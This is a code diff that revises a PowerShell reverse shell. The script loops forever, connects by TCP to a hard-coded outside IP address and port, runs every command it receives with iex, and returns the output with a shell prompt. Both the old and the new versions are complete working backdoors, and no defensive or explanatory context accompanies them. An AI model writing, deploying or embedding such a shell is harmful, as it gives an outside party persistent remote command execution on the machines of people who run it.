@@ -1,31 +1,40 @@
 while ($true) {
     try {
-        $client = New-Object System.Net.Sockets.TCPClient("67.183.186.191",4911)
-        $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535 | % {0}
+        $client = New-Object System.Net.Sockets.TCPClient
+        $client.Connect("67.183.186.191", 4911)
 
-        while ($stream.CanRead) {
-            try {
-                $i = $stream.Read($bytes, 0, $bytes.Length)
-                if ($i -le 0) { break }  # Stream closed
+        if ($client.Connected) {
+            $stream = $client.GetStream()
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $reader = New-Object System.IO.StreamReader($stream)
+            $writer.AutoFlush = $true
 
-                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-                if ($data -eq "exit") { break }  # Exit command from server
+            $prompt = "PS " + (pwd).Path + "> "
+            $writer.WriteLine("Connected: $prompt")
 
-                $sendback = (iex $data 2>&1 | Out-String)
-                $sendback2 = $sendback + "PS " + (pwd).Path + "> "
-                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-                $stream.Write($sendbyte, 0, $sendbyte.Length)
-                $stream.Flush()
-            } catch {
-                break  # Any error: break the inner loop and retry
+            while ($client.Connected -and $stream.CanRead) {
+                try {
+                    $data = $reader.ReadLine()
+                    if ($data -eq "exit") { break }
+
+                    $result = iex $data 2>&1 | Out-String
+                    $response = $result + "`n" + $prompt
+                    $writer.WriteLine($response)
+                } catch {
+                    $writer.WriteLine("Error: $_")
+                    break
+                }
             }
-        }
 
-        $stream.Close()
-        $client.Close()
+            # Cleanup
+            $reader.Close()
+            $writer.Close()
+            $stream.Close()
+            $client.Close()
+        }
     } catch {
-        # Connection failed — retry quietly
+        # Optional logging for local debugging:
+        # Add-Content -Path "$env:TEMP\revshlog.txt" -Value "[$(Get-Date)] Error: $_"
     }
 
     Start-Sleep -Seconds 10
